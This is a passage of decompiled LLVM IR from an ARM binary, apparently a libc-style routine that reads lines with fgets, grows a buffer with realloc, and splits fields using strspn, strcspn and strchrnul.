dec_label_pc_1ef78:                               ; preds = %dec_label_pc_1ef24, %dec_label_pc_1ef6c
  %v1_1ef80 = phi i32 [ %v2_1ef40, %dec_label_pc_1ef24 ], [ %v0_1ef78.pre, %dec_label_pc_1ef6c ]
  %v1_1ef78 = add i32 %v1_1ef80, 4
  %v2_1ef78 = inttoptr i32 %v1_1ef78 to i32*
  %v3_1ef78 = load i32, i32* %v2_1ef78, align 4
  store i32 %v3_1ef78, i32* %r2.global-to-local, align 4
  %v4_1ef78 = add i32 %v1_1ef80, 8
  %v5_1ef78 = inttoptr i32 %v4_1ef78 to i32*
  %v6_1ef78 = load i32, i32* %v5_1ef78, align 4
  %v2_1ef7c = add i32 %v6_1ef78, %v3_1ef78
  store i32 %v2_1ef7c, i32* %r3.global-to-local, align 4
  %v2_1ef80 = add i32 %v1_1ef80, 12
  %v3_1ef80 = inttoptr i32 %v2_1ef80 to i32*
  store i32 %v2_1ef7c, i32* %v3_1ef80, align 4
  %v0_1ef84 = load i32, i32* @fp, align 4
  store i32 %v0_1ef84, i32* @r6, align 4
  br label %dec_label_pc_1ef88

dec_label_pc_1ef88:                               ; preds = %dec_label_pc_1f014, %dec_label_pc_1f000, %dec_label_pc_1ef78
  %v0_1ef90 = phi i32 [ %v0_1ef84, %dec_label_pc_1ef78 ], [ %v1_1f000, %dec_label_pc_1f000 ], [ %v0_1ef90.pre.pre, %dec_label_pc_1f014 ]
  %v0_1ef88 = load i32, i32* @r5, align 4
  %v1_1ef88 = add i32 %v0_1ef88, 12
  store i32 %v1_1ef88, i32* %r0.global-to-local, align 4
  %v1_1ef8c = inttoptr i32 %v1_1ef88 to i32*
  %v2_1ef8c = load i32, i32* %v1_1ef8c, align 4
  store i32 %v2_1ef8c, i32* %r0.global-to-local, align 4
  %v3_1ef8c = add i32 %v0_1ef88, 16
  %v4_1ef8c = inttoptr i32 %v3_1ef8c to i32*
  %v5_1ef8c = load i32, i32* %v4_1ef8c, align 4
  %v2_1ef90 = add i32 %v2_1ef8c, %v0_1ef90
  store i32 %v2_1ef90, i32* %r0.global-to-local, align 4
  %v2_1ef94 = sub i32 %v5_1ef8c, %v0_1ef90
  %v1_1ef98 = inttoptr i32 %v0_1ef88 to i32*
  %v2_1ef98 = load i32, i32* %v1_1ef98, align 4
  store i32 %v2_1ef98, i32* %r2.global-to-local, align 4
  %v3_1ef9c = call i32 @fgets(i32 %v2_1ef90, i32 %v2_1ef94, i32 %v2_1ef98)
  store i32 %v3_1ef9c, i32* %r0.global-to-local, align 4
  store i32 %v3_1ef9c, i32* %r4.global-to-local, align 4
  %v2_1efa0 = icmp eq i32 %v3_1ef9c, 0
  store i1 %v2_1efa0, i1* %cpsr_z.global-to-local, align 1
  %v0_1efa8 = load i32, i32* @r5, align 4
  %v1_1efa8 = add i32 %v0_1efa8, 12
  br i1 %v2_1efa0, label %dec_label_pc_1efa8, label %dec_label_pc_1efc0

dec_label_pc_1efa8:                               ; preds = %dec_label_pc_1ef88
  store i32 %v1_1efa8, i32* %r0.global-to-local, align 4
  %v1_1efac = inttoptr i32 %v1_1efa8 to i32*
  %v2_1efac = load i32, i32* %v1_1efac, align 4
  store i32 %v2_1efac, i32* %r0.global-to-local, align 4
  %v3_1efac = add i32 %v0_1efa8, 16
  %v4_1efac = inttoptr i32 %v3_1efac to i32*
  %v5_1efac = load i32, i32* %v4_1efac, align 4
  store i32 %v5_1efac, i32* %r2.global-to-local, align 4
  %v3_1efb4 = inttoptr i32 %v2_1efac to i8*
  %v4_1efb4 = call i32 @__GI_memset(i8* %v3_1efb4, i32 0, i32 %v5_1efac)
  store i32 %v4_1efb4, i32* %r0.global-to-local, align 4
  %v0_1efb8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1f1d8

dec_label_pc_1efc0:                               ; preds = %dec_label_pc_1ef88
  %v2_1efc0 = inttoptr i32 %v1_1efa8 to i32*
  %v3_1efc0 = load i32, i32* %v2_1efc0, align 4
  store i32 %v3_1efc0, i32* @r4, align 4
  %v1_1efc4 = load i32, i32* @r6, align 4
  %v2_1efc4 = add i32 %v1_1efc4, %v3_1efc0
  %v3_1efc4 = inttoptr i32 %v2_1efc4 to i8*
  store i32 %v2_1efc4, i32* %r0.global-to-local, align 4
  %v3_1efc8 = call i32 @strlen(i8* %v3_1efc4)
  %v0_1efd0 = load i32, i32* @r6, align 4
  %v2_1efd0 = add i32 %v0_1efd0, %v3_1efc8
  store i32 %v2_1efd0, i32* @r6, align 4
  %v0_1efd4 = load i32, i32* @r4, align 4
  store i32 %v0_1efd4, i32* @r0, align 4
  %v2_1efd8 = call i32 @__GI_strchr(i32 %v0_1efd4, i32 10)
  store i32 %v2_1efd8, i32* %r0.global-to-local, align 4
  %v2_1efdc = icmp eq i32 %v2_1efd8, 0
  store i1 %v2_1efdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1efdc, label %dec_label_pc_1f008, label %dec_label_pc_1efe4

dec_label_pc_1efe4:                               ; preds = %dec_label_pc_1efc0
  %v1_1efe4 = inttoptr i32 %v2_1efd8 to i8*
  %v2_1efe4 = load i8, i8* %v1_1efe4, align 1
  %v3_1efe4 = zext i8 %v2_1efe4 to i32
  %v1_1efe8 = add nuw nsw i32 %v3_1efe4, 255
  %v1_1efec = urem i32 %v1_1efe8, 256
  store i32 %v1_1efec, i32* %r3.global-to-local, align 4
  %v7_1eff0 = icmp eq i32 %v1_1efec, 92
  store i1 %v7_1eff0, i1* %cpsr_z.global-to-local, align 1
  %v1_1eff4 = trunc i32 %v1_1efe8 to i8
  store i8 %v1_1eff4, i8* %v1_1efe4, align 1
  %v0_1eff8 = load i32, i32* @r6, align 4
  %v1_1eff8 = add i32 %v0_1eff8, -1
  store i32 %v1_1eff8, i32* @r6, align 4
  %v0_1effc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1effc, label %dec_label_pc_1f000, label %dec_label_pc_1f08c

dec_label_pc_1f000:                               ; preds = %dec_label_pc_1efe4
  %v1_1f000 = add i32 %v0_1eff8, -2
  store i32 %v1_1f000, i32* @r6, align 4
  br label %dec_label_pc_1ef88

dec_label_pc_1f008:                               ; preds = %dec_label_pc_1efc0
  %v0_1f008 = load i32, i32* @r5, align 4
  %v1_1f008 = add i32 %v0_1f008, 20
  %v2_1f008 = inttoptr i32 %v1_1f008 to i32*
  %v3_1f008 = load i32, i32* %v2_1f008, align 4
  store i32 %v3_1f008, i32* %r3.global-to-local, align 4
  %v2_1f00c = icmp eq i32 %v3_1f008, 0
  store i1 %v2_1f00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f00c, label %dec_label_pc_1f044, label %dec_label_pc_1f014

dec_label_pc_1f014:                               ; preds = %dec_label_pc_1f008
  %v1_1f014 = add i32 %v0_1f008, 16
  %v2_1f014 = inttoptr i32 %v1_1f014 to i32*
  %v3_1f014 = load i32, i32* %v2_1f014, align 4
  store i32 %v3_1f014, i32* %r3.global-to-local, align 4
  %v1_1f018 = add i32 %v0_1f008, 8
  %v2_1f018 = inttoptr i32 %v1_1f018 to i32*
  %v3_1f018 = load i32, i32* %v2_1f018, align 4
  %v1_1f01c = add i32 %v3_1f014, 4096
  store i32 %v1_1f01c, i32* %r3.global-to-local, align 4
  %v2_1f020 = add i32 %v3_1f018, %v1_1f01c
  store i32 %v1_1f01c, i32* %v2_1f014, align 4
  %v0_1f028 = load i32, i32* @r5, align 4
  %v1_1f028 = add i32 %v0_1f028, 4
  %v2_1f028 = inttoptr i32 %v1_1f028 to i32*
  %v3_1f028 = load i32, i32* %v2_1f028, align 4
  store i32 %v3_1f028, i32* %r0.global-to-local, align 4
  %v2_1f02c = inttoptr i32 %v3_1f028 to i32*
  %v3_1f02c = call i32 @realloc(i32* %v2_1f02c, i32 %v2_1f020)
  store i32 %v3_1f02c, i32* %r0.global-to-local, align 4
  %v0_1f030 = load i32, i32* @r5, align 4
  %v1_1f030 = add i32 %v0_1f030, 8
  %v2_1f030 = inttoptr i32 %v1_1f030 to i32*
  %v3_1f030 = load i32, i32* %v2_1f030, align 4
  %v2_1f034 = add i32 %v3_1f030, %v3_1f02c
  store i32 %v2_1f034, i32* %r3.global-to-local, align 4
  %v2_1f038 = add i32 %v0_1f030, 12
  %v3_1f038 = inttoptr i32 %v2_1f038 to i32*
  store i32 %v2_1f034, i32* %v3_1f038, align 4
  %v1_1f03c = load i32, i32* @r5, align 4
  %v2_1f03c = add i32 %v1_1f03c, 4
  %v3_1f03c = inttoptr i32 %v2_1f03c to i32*
  store i32 %v3_1f02c, i32* %v3_1f03c, align 4
  %v0_1ef90.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1ef88

dec_label_pc_1f044:                               ; preds = %dec_label_pc_1f008, %.dec_label_pc_1f044_crit_edge
  %v0_1f044 = phi i32 [ %v0_1f044.pre, %.dec_label_pc_1f044_crit_edge ], [ %v0_1f008, %dec_label_pc_1f008 ]
  %v1_1f044 = inttoptr i32 %v0_1f044 to i32*
  %v2_1f044 = load i32, i32* %v1_1f044, align 4
  store i32 %v2_1f044, i32* @r1, align 4
  %v1_1f048 = add i32 %v2_1f044, 52
  %v2_1f048 = inttoptr i32 %v1_1f048 to i32*
  %v3_1f048 = load i32, i32* %v2_1f048, align 4
  store i32 %v3_1f048, i32* %r3.global-to-local, align 4
  %v2_1f04c = icmp eq i32 %v3_1f048, 0
  store i1 %v2_1f04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f04c, label %dec_label_pc_1f078, label %dec_label_pc_1f054

dec_label_pc_1f054:                               ; preds = %dec_label_pc_1f044
  %v1_1f054 = add i32 %v2_1f044, 16
  %v2_1f054 = inttoptr i32 %v1_1f054 to i32*
  %v3_1f054 = load i32, i32* %v2_1f054, align 4
  store i32 %v3_1f054, i32* %r2.global-to-local, align 4
  %v1_1f058 = add i32 %v2_1f044, 24
  %v2_1f058 = inttoptr i32 %v1_1f058 to i32*
  %v3_1f058 = load i32, i32* %v2_1f058, align 4
  store i32 %v3_1f058, i32* %r3.global-to-local, align 4
  %v3_1f05c = icmp ult i32 %v3_1f054, %v3_1f058
  %v9_1f05c = icmp eq i32 %v3_1f054, %v3_1f058
  store i1 %v9_1f05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1f05c, label %dec_label_pc_1f080thread-pre-split, label %dec_label_pc_1f06c

dec_label_pc_1f06c:                               ; preds = %dec_label_pc_1f054
  store i32 %v2_1f044, i32* %r0.global-to-local, align 4
  %v1_1f070 = inttoptr i32 %v2_1f044 to i16*
  %v2_1f070 = call i32 @getc_unlocked(i16* %v1_1f070)
  store i32 %v2_1f070, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f080

dec_label_pc_1f078:                               ; preds = %dec_label_pc_1f044
  store i32 %v2_1f044, i32* %r0.global-to-local, align 4
  %v1_1f07c = call i32 @__GI_fgetc(i32 %v2_1f044)
  store i32 %v1_1f07c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f080

dec_label_pc_1f080thread-pre-split:               ; preds = %dec_label_pc_1f054
  %v2_1f060 = inttoptr i32 %v3_1f054 to i8*
  %v3_1f060 = load i8, i8* %v2_1f060, align 1
  %v4_1f060 = zext i8 %v3_1f060 to i32
  store i32 %v4_1f060, i32* %r0.global-to-local, align 4
  %v6_1f060 = add i32 %v3_1f054, 1
  store i32 %v6_1f060, i32* %r2.global-to-local, align 4
  store i32 %v6_1f060, i32* %v2_1f054, align 4
  %v0_1f080.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f080

dec_label_pc_1f080:                               ; preds = %dec_label_pc_1f080thread-pre-split, %dec_label_pc_1f06c, %dec_label_pc_1f078
  %v1_1f084 = phi i32 [ %v0_1f080.pr, %dec_label_pc_1f080thread-pre-split ], [ %v2_1f070, %dec_label_pc_1f06c ], [ %v1_1f07c, %dec_label_pc_1f078 ]
  %v7_1f080 = icmp eq i32 %v1_1f084, 10
  store i1 %v7_1f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f080, label %dec_label_pc_1f08c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_1f080
  %v8_1f084 = icmp eq i32 %v1_1f084, -1
  store i1 %v8_1f084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1f084, label %dec_label_pc_1f08c.loopexit, label %.dec_label_pc_1f044_crit_edge

.dec_label_pc_1f044_crit_edge:                    ; preds = %bb66
  %v0_1f044.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1f044

dec_label_pc_1f08c.loopexit:                      ; preds = %bb66, %dec_label_pc_1f080
  %v0_1f08c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1f08c

dec_label_pc_1f08c:                               ; preds = %dec_label_pc_1efe4, %dec_label_pc_1f08c.loopexit
  %v0_1f08c = phi i32 [ %v0_1f08c.pre, %dec_label_pc_1f08c.loopexit ], [ %v1_1eff8, %dec_label_pc_1efe4 ]
  %v7_1f08c = icmp eq i32 %v0_1f08c, -1
  store i1 %v7_1f08c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f08c, label %dec_label_pc_1f1d4, label %dec_label_pc_1f094

dec_label_pc_1f094:                               ; preds = %dec_label_pc_1f08c
  store i32 %v1_1eefc, i32* %r3.global-to-local, align 4
  store i1 %v2_1f098, i1* %cpsr_z.global-to-local, align 1
  %v0_1f09c = load i32, i32* @r5, align 4
  %v1_1f09c = add i32 %v0_1f09c, 12
  %v2_1f09c = inttoptr i32 %v1_1f09c to i32*
  %v3_1f09c = load i32, i32* %v2_1f09c, align 4
  store i32 %v3_1f09c, i32* @r4, align 4
  br i1 %v2_1f098, label %dec_label_pc_1f0b4, label %dec_label_pc_1f0a4

dec_label_pc_1f0a4:                               ; preds = %dec_label_pc_1f094
  store i32 %v3_1f09c, i32* @r0, align 4
  %v0_1f0a8 = load i32, i32* @sl, align 4
  %v2_1f0ac = inttoptr i32 %v3_1f09c to i8*
  %v3_1f0ac = call i32 @__GI_strspn(i8* %v2_1f0ac, i32 %v0_1f0a8)
  store i32 %v3_1f0ac, i32* %r0.global-to-local, align 4
  %v0_1f0b0 = load i32, i32* @r4, align 4
  %v2_1f0b0 = add i32 %v0_1f0b0, %v3_1f0ac
  store i32 %v2_1f0b0, i32* @r4, align 4
  br label %dec_label_pc_1f0b4

dec_label_pc_1f0b4:                               ; preds = %dec_label_pc_1f094, %dec_label_pc_1f0a4
  %v0_1f0b4 = phi i32 [ %v3_1f09c, %dec_label_pc_1f094 ], [ %v2_1f0b0, %dec_label_pc_1f0a4 ]
  %v1_1f0b4 = inttoptr i32 %v0_1f0b4 to i8*
  %v2_1f0b4 = load i8, i8* %v1_1f0b4, align 1
  %v3_1f0b4 = zext i8 %v2_1f0b4 to i32
  store i32 %v3_1f0b4, i32* %r2.global-to-local, align 4
  %v2_1f0b8 = icmp eq i8 %v2_1f0b4, 0
  store i1 %v2_1f0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f0b8, label %dec_label_pc_1ef24.backedge, label %dec_label_pc_1f0c0

dec_label_pc_1ef24.backedge:                      ; preds = %dec_label_pc_1f0b4, %dec_label_pc_1f0c0, %dec_label_pc_1f1cc
  %v0_1ef24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ef24

dec_label_pc_1f0c0:                               ; preds = %dec_label_pc_1f0b4
  %v0_1f0c0 = load i32, i32* @r7, align 4
  %v1_1f0c0 = inttoptr i32 %v0_1f0c0 to i8*
  %v2_1f0c0 = load i8, i8* %v1_1f0c0, align 1
  %v3_1f0c0 = zext i8 %v2_1f0c0 to i32
  store i32 %v3_1f0c0, i32* %r3.global-to-local, align 4
  %v9_1f0c4 = icmp eq i8 %v2_1f0c0, %v2_1f0b4
  store i1 %v9_1f0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1f0c4, label %dec_label_pc_1ef24.backedge, label %dec_label_pc_1f0cc

dec_label_pc_1f0cc:                               ; preds = %dec_label_pc_1f0c0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_1f0d0 = load i32, i32* @r5, align 4
  %v1_1f0d0 = add i32 %v0_1f0d0, 4
  %v2_1f0d0 = inttoptr i32 %v1_1f0d0 to i32*
  %v3_1f0d0 = load i32, i32* %v2_1f0d0, align 4
  store i32 %v3_1f0d0, i32* %r0.global-to-local, align 4
  %v0_1f0d4 = load i32, i32* @fp, align 4
  store i32 %v3_1f0d0, i32* %v1_1f0f0, align 4
  store i32 %v3_1eee8, i32* %r2.global-to-local, align 4
  %v3_1f0e0 = inttoptr i32 %v3_1f0d0 to i8*
  %v4_1f0e0 = call i32 @__GI_memset(i8* %v3_1f0e0, i32 %v0_1f0d4, i32 %v3_1eee8)
  store i32 %v4_1f0e0, i32* %r0.global-to-local, align 4
  %v0_1f0e4 = load i32, i32* @fp, align 4
  store i32 %v0_1f0e4, i32* @r6, align 4
  %v0_1f1a412 = load i32, i32* @r4, align 4
  %v1_1f1a413 = inttoptr i32 %v0_1f1a412 to i8*
  %v2_1f1a414 = load i8, i8* %v1_1f1a413, align 1
  %v3_1f1a415 = zext i8 %v2_1f1a414 to i32
  store i32 %v3_1f1a415, i32* %r2.global-to-local, align 4
  %v2_1f1a816 = icmp eq i8 %v2_1f1a414, 0
  store i1 %v2_1f1a816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f1a816, label %dec_label_pc_1f1c0, label %dec_label_pc_1f1b0

dec_label_pc_1f0ec:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_1f0f0 = load i32, i32* %v1_1f0f0, align 4
  store i32 %v2_1f0f0, i32* %r3.global-to-local, align 4
  store i32 %v1_1ef00, i32* %r2.global-to-local, align 4
  %v9_1f0f8 = icmp eq i32 %v2_1f0fc, %v1_1ef00
  store i1 %v9_1f0f8, i1* %cpsr_z.global-to-local, align 1
  %v5_1f0fc = mul i32 %v2_1f0fc, 4
  %v6_1f0fc = add i32 %v2_1f0f0, %v5_1f0fc
  %v7_1f0fc = inttoptr i32 %v6_1f0fc to i32*
  store i32 %v0_1f0fc, i32* %v7_1f0fc, align 4
  br i1 %v9_1f0f8, label %dec_label_pc_1f104, label %dec_label_pc_1f110

dec_label_pc_1f104:                               ; preds = %dec_label_pc_1f0ec
  store i32 %v1_1ef0c, i32* %r3.global-to-local, align 4
  store i1 %v2_1f108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f108, label %dec_label_pc_1f110, label %dec_label_pc_1f130

dec_label_pc_1f110:                               ; preds = %dec_label_pc_1f104, %dec_label_pc_1f0ec
  %v0_1f110 = load i32, i32* @r7, align 4
  %v1_1f110 = inttoptr i32 %v0_1f110 to i8*
  %v2_1f110 = load i8, i8* %v1_1f110, align 1
  %v3_1f110 = zext i8 %v2_1f110 to i32
  store i32 %v3_1f110, i32* %r3.global-to-local, align 4
  %v2_1f114 = icmp eq i8 %v2_1f110, 0
  store i1 %v2_1f114, i1* %cpsr_z.global-to-local, align 1
  %v0_1f118 = load i32, i32* @r4, align 4
  store i32 %v0_1f118, i32* @r0, align 4
  %v1_1f11c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_1f114, i32 %v1_1f11c, i32 %v0_1f110
  store i32 %storemerge, i32* @r1, align 4
  %v0_1f124 = call i32 @strcspn()
  store i32 %v0_1f124, i32* %r0.global-to-local, align 4
  %v0_1f128 = load i32, i32* @r4, align 4
  %v2_1f128 = add i32 %v0_1f128, %v0_1f124
  store i32 %v2_1f128, i32* @r4, align 4
  br label %dec_label_pc_1f168

dec_label_pc_1f130:                               ; preds = %dec_label_pc_1f104
  %v0_1f130 = load i32, i32* @r4, align 4
  store i32 %v0_1f130, i32* @r0, align 4
  %v0_1f134 = load i32, i32* @r7, align 4
  %v1_1f134 = inttoptr i32 %v0_1f134 to i8*
  %v2_1f134 = load i8, i8* %v1_1f134, align 1
  %v3_1f134 = zext i8 %v2_1f134 to i32
  %v5_1f138 = call i32 @__GI_strchrnul(i32 %v0_1f130, i32 %v3_1f134, i32 %v1_1ef00, i32 %v1_1ef0c)
  store i32 %v5_1f138, i32* %r0.global-to-local, align 4
  store i32 %v1_1eefc, i32* %r2.global-to-local, align 4
  store i1 %v2_1f098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1f138, i32* @r4, align 4
  br i1 %v2_1f098, label %dec_label_pc_1f168, label %dec_label_pc_1f154

dec_label_pc_1f150:                               ; preds = %dec_label_pc_1f154
  %v1_1f150 = add i32 %v0_1f168.pre, -1
  store i32 %v1_1f150, i32* @r4, align 4
  br label %dec_label_pc_1f154

dec_label_pc_1f154:                               ; preds = %dec_label_pc_1f130, %dec_label_pc_1f150
  %v0_1f154 = phi i32 [ %v1_1f150, %dec_label_pc_1f150 ], [ %v5_1f138, %dec_label_pc_1f130 ]
  %v1_1f154 = add i32 %v0_1f154, -1
  %v2_1f154 = inttoptr i32 %v1_1f154 to i8*
  %v3_1f154 = load i8, i8* %v2_1f154, align 1
  %v4_1f154 = zext i8 %v3_1f154 to i32
  %v0_1f158 = load i32, i32* @sl, align 4
  store i32 %v0_1f158, i32* @r0, align 4
  %v2_1f15c = call i32 @__GI_strchr(i32 %v0_1f158, i32 %v4_1f154)
  store i32 %v2_1f15c, i32* %r0.global-to-local, align 4
  %v2_1f160 = icmp eq i32 %v2_1f15c, 0
  store i1 %v2_1f160, i1* %cpsr_z.global-to-local, align 1
  %v0_1f168.pre = load i32, i32* @r4, align 4
  br i1 %v2_1f160, label %dec_label_pc_1f168, label %dec_label_pc_1f150

dec_label_pc_1f168:                               ; preds = %dec_label_pc_1f154, %dec_label_pc_1f130, %dec_label_pc_1f110
  %v3_1f174 = phi i32 [ %v5_1f138, %dec_label_pc_1f130 ], [ %v2_1f128, %dec_label_pc_1f110 ], [ %v0_1f168.pre, %dec_label_pc_1f154 ]
  %v1_1f168 = inttoptr i32 %v3_1f174 to i8*
  %v2_1f168 = load i8, i8* %v1_1f168, align 1
  %v3_1f168 = zext i8 %v2_1f168 to i32
  store i32 %v3_1f168, i32* %r2.global-to-local, align 4
  %v0_1f16c = load i32, i32* @r7, align 4
  %v1_1f16c = inttoptr i32 %v0_1f16c to i8*
  %v2_1f16c = load i8, i8* %v1_1f16c, align 1
  %v3_1f16c = zext i8 %v2_1f16c to i32
  store i32 %v3_1f16c, i32* %r3.global-to-local, align 4
  %v9_1f170 = icmp eq i8 %v2_1f16c, %v2_1f168
  store i1 %v9_1f170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1f170, label %bb69, label %dec_label_pc_1f17c

bb69:                                             ; preds = %dec_label_pc_1f168
  %v1_1f174 = load i32, i32* @fp, align 4
  %v2_1f174 = trunc i32 %v1_1f174 to i8
  store i8 %v2_1f174, i8* %v1_1f168, align 1
  %v0_1f178.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1f178.pr, label %bb71, label %.dec_label_pc_1f17c_crit_edge

.dec_label_pc_1f17c_crit_edge:                    ; preds = %bb69
  %v0_1f17c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f17c

dec_label_pc_1f17c:                               ; preds = %.dec_label_pc_1f17c_crit_edge, %dec_label_pc_1f168
  %v0_1f17c = phi i32 [ %v0_1f17c.pre, %.dec_label_pc_1f17c_crit_edge ], [ %v3_1f168, %dec_label_pc_1f168 ]
  %v2_1f17c = icmp eq i32 %v0_1f17c, 0
  store i1 %v2_1f17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f17c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1f17c
  %v1_1f180 = load i32, i32* @fp, align 4
  %v2_1f180 = trunc i32 %v1_1f180 to i8
  %v3_1f180 = load i32, i32* @r4, align 4
  %v4_1f180 = inttoptr i32 %v3_1f180 to i8*
  store i8 %v2_1f180, i8* %v4_1f180, align 1
  %v5_1f180 = load i32, i32* @r4, align 4
  %v6_1f180 = add i32 %v5_1f180, 1
  store i32 %v6_1f180, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1f17c, %bb70
  %v2_1f184 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1f184, i32* %r3.global-to-local, align 4
  %v2_1f188 = icmp eq i32 %v2_1f184, 0
  store i1 %v2_1f188, i1* %cpsr_z.global-to-local, align 1
  %v0_1f1a4.pre = load i32, i32* @r4, align 4
  br i1 %v2_1f188, label %dec_label_pc_1f1a0, label %dec_label_pc_1f190

dec_label_pc_1f190:                               ; preds = %bb71
  store i32 %v0_1f1a4.pre, i32* @r0, align 4
  %v0_1f194 = load i32, i32* @sl, align 4
  %v2_1f198 = inttoptr i32 %v0_1f1a4.pre to i8*
  %v3_1f198 = call i32 @__GI_strspn(i8* %v2_1f198, i32 %v0_1f194)
  store i32 %v3_1f198, i32* %r0.global-to-local, align 4
  %v0_1f19c = load i32, i32* @r4, align 4
  %v2_1f19c = add i32 %v0_1f19c, %v3_1f198
  store i32 %v2_1f19c, i32* @r4, align 4
  br label %dec_label_pc_1f1a0

dec_label_pc_1f1a0:                               ; preds = %bb71, %dec_label_pc_1f190
  %v0_1f1a4 = phi i32 [ %v2_1f19c, %dec_label_pc_1f190 ], [ %v0_1f1a4.pre, %bb71 ]
  %v0_1f1a0 = load i32, i32* @r6, align 4
  %v1_1f1a0 = add i32 %v0_1f1a0, 1
  store i32 %v1_1f1a0, i32* @r6, align 4
  %v1_1f1a4 = inttoptr i32 %v0_1f1a4 to i8*
  %v2_1f1a4 = load i8, i8* %v1_1f1a4, align 1
  %v3_1f1a4 = zext i8 %v2_1f1a4 to i32
  store i32 %v3_1f1a4, i32* %r2.global-to-local, align 4
  %v2_1f1a8 = icmp eq i8 %v2_1f1a4, 0
  store i1 %v2_1f1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f1a8, label %dec_label_pc_1f1c0, label %dec_label_pc_1f1b0

dec_label_pc_1f1b0:                               ; preds = %dec_label_pc_1f0cc, %dec_label_pc_1f1a0
  %v0_1f0fc = phi i32 [ %v0_1f1a4, %dec_label_pc_1f1a0 ], [ %v0_1f1a412, %dec_label_pc_1f0cc ]
  %v2_1f0fc = phi i32 [ %v1_1f1a0, %dec_label_pc_1f1a0 ], [ %v0_1f0e4, %dec_label_pc_1f0cc ]
  %v1_1f1b4 = phi i32 [ %v3_1f1a4, %dec_label_pc_1f1a0 ], [ %v3_1f1a415, %dec_label_pc_1f0cc ]
  %v0_1f1b0 = load i32, i32* @r7, align 4
  %v1_1f1b0 = inttoptr i32 %v0_1f1b0 to i8*
  %v2_1f1b0 = load i8, i8* %v1_1f1b0, align 1
  %v3_1f1b0 = zext i8 %v2_1f1b0 to i32
  store i32 %v3_1f1b0, i32* %r3.global-to-local, align 4
  %v9_1f1b4 = icmp eq i32 %v3_1f1b0, %v1_1f1b4
  store i1 %v9_1f1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1f1b4, label %dec_label_pc_1f1c0, label %bb72

bb72:                                             ; preds = %dec_label_pc_1f1b0
  %v2_1f1b8 = load i32, i32* @sb, align 4
  %v3_1f1b8 = sub i32 %v2_1f0fc, %v2_1f1b8
  %v5_1f1b8 = xor i32 %v2_1f1b8, %v2_1f0fc
  %v6_1f1b8 = xor i32 %v3_1f1b8, %v2_1f0fc
  %v7_1f1b8 = and i32 %v6_1f1b8, %v5_1f1b8
  %v8_1f1b8 = icmp slt i32 %v7_1f1b8, 0
  %v9_1f1b8 = icmp slt i32 %v3_1f1b8, 0
  %v10_1f1b8 = icmp eq i32 %v2_1f0fc, %v2_1f1b8
  store i1 %v10_1f1b8, i1* %cpsr_z.global-to-local, align 1
  %v2_1f1bc = xor i1 %v9_1f1b8, %v8_1f1b8
  br i1 %v2_1f1bc, label %dec_label_pc_1f0ec, label %dec_label_pc_1f1c0

dec_label_pc_1f1c0:                               ; preds = %dec_label_pc_1f1b0, %dec_label_pc_1f1a0, %bb72, %dec_label_pc_1f0cc
  %v0_1f1c4 = phi i32 [ %v0_1f0e4, %dec_label_pc_1f0cc ], [ %v2_1f0fc, %dec_label_pc_1f1b0 ], [ %v1_1f1a0, %dec_label_pc_1f1a0 ], [ %v2_1f0fc, %bb72 ]
  store i32 %v3_1eee4, i32* %r2.global-to-local, align 4
  %v9_1f1c4 = icmp eq i32 %v0_1f1c4, %v3_1eee4
  store i1 %v9_1f1c4, i1* %cpsr_z.global-to-local, align 1
  %v6_1f1c8 = icmp slt i32 %v0_1f1c4, %v3_1eee4
  br i1 %v6_1f1c8, label %dec_label_pc_1f1cc, label %dec_label_pc_1f1d8

dec_label_pc_1f1cc:                               ; preds = %dec_label_pc_1f1c0
  %v0_1f1cc = load i32, i32* @r8, align 4
  %v1_1f1cc = and i32 %v0_1f1cc, 1048576
  %v2_1f1cc = icmp eq i32 %v1_1f1cc, 0
  store i1 %v2_1f1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f1cc, label %dec_label_pc_1ef24.backedge, label %dec_label_pc_1f1d4

dec_label_pc_1f1d4:                               ; preds = %dec_label_pc_1f1cc, %dec_label_pc_1f08c, %.thread, %entry
  br label %dec_label_pc_1f1d8

dec_label_pc_1f1d8:                               ; preds = %dec_label_pc_1f1c0, %dec_label_pc_1efa8, %dec_label_pc_1f1d4
  %v0_1f1d8 = phi i32 [ %v0_1efb8, %dec_label_pc_1efa8 ], [ 0, %dec_label_pc_1f1d4 ], [ %v0_1f1c4, %dec_label_pc_1f1c0 ]
  store i32 %v0_1f1d8, i32* %r0.global-to-local, align 4
  store i32 %v3_1eec0, i32* @r4, align 4
  store i32 %v6_1eec0, i32* @r5, align 4
